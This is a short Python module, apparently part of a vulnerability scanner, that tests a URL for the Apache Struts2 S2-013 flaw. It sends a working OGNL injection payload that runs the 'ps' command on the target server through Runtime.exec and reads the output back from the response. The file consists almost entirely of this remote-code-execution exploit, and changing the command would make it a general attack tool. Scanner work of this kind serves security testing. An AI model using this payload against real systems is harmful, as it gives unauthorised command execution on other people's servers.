# -*- encoding: utf-8 -*-
'''
@File : s2_013.py
@Time : 2019/08/03 22:01:58
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys

def s2_013(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('ps').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "PID" in resp.text:
            print(Vcolors.RED +"存在S2-013漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-013漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-013漏洞~"+ Vcolors.ENDC)